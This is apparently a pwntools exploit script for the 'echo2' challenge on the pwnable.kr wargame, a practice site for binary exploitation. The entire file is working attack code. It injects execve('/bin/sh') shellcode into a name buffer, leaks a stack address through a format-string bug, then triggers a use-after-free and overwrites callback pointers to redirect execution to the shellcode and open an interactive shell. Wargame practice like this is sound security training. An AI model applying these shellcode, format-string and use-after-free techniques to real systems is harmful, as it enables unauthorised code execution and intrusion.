from pwn import *

exe = ELF("./echo2", checksec=True)

context.binary = exe

HOST = "pwnable.kr"
PORT = 10026

gdbscript = """
set follow-fork-mode child
# b *0x400864
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def fsb_echo(r, s):
    r.sendlineafter(b"> ", b"2")
    r.sendline(s)

def uaf_echo(r, s):
    r.sendlineafter(b"> ", b"3")
    r.sendline(s)

STACK = 0

def write_shellcode_to_name(r):
    sh = asm("""
    xor esi, esi
    mov rbx, 0x68732f2f6e69622f
    push rsi
    push rbx
    push rsp
    pop rdi
    push 59
    pop rax
    xor edx, edx
    syscall
    """)

    r.sendlineafter(b": ", sh)
    
def leak_stack(r):
    fsb_echo(r, b"%10$p")
    r.recvline()

    global STACK
    STACK = int(r.recvline().strip(), 16)
    log.success(f"LEAKED STACK: {hex(STACK)}")

def trigger_uaf(r):
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b"n)", b"n")

def overwrite_callbacks(r):
    uaf_echo(r, b"a" * 24 + pack(STACK - 0x20))

def main():
    r  = conn()
    
    write_shellcode_to_name(r)
    leak_stack(r)

    trigger_uaf(r)
    overwrite_callbacks(r)
    
    r.interactive()

if __name__ == "__main__":
    main()
